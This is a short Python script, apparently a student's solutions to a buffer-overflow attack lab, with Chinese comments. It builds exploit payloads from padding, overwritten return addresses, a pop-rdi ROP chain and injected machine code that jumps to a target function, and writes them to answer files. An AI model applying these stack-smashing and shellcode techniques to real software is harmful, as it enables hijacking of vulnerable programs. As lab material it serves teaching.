'''
padding = b"A" * 16
func1_address = b'\x16\x12\x40\x00\x00\x00\x00\x00'    # 小端地址
payload = padding+ func1_address
# Write the payload to a file
with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")

padding = b'A' * 16   
pop_rdi_addr = b'\xc7\x12\x40\x00\x00\x00\x00\x00'  
func2_val = b'\xf8\x03\x00\x00\x00\x00\x00\x00'  
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'  
# 正确的payload：按顺序拼接
payload = padding  + pop_rdi_addr + func2_val + func2_addr  
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")

padding = b'A' * 16   
pop_rdi_addr = b'\x4c\x12\x40\x00\x00\x00\x00\x00'  
# 正确的payload：按顺序拼接
payload = padding  + pop_rdi_addr 
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
'''

# 弄一个汇编指令 move edi 0x72
assign_machine_code = b"\xbf\x72\x00\x00\x00"
# push 0x401216 + ret → 机器码：0x68 16 12 40 00 + 0xc3
jmp_func1_code = b"\x68\x16\x12\x40\x00\xc3"

payload = assign_machine_code + jmp_func1_code  
payload = payload.ljust(40, b"A")            
payload += b"\x34\x13\x40\x00\x00\x00\x00\x00" # retaddr 变成 jmp_xs 
      
# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")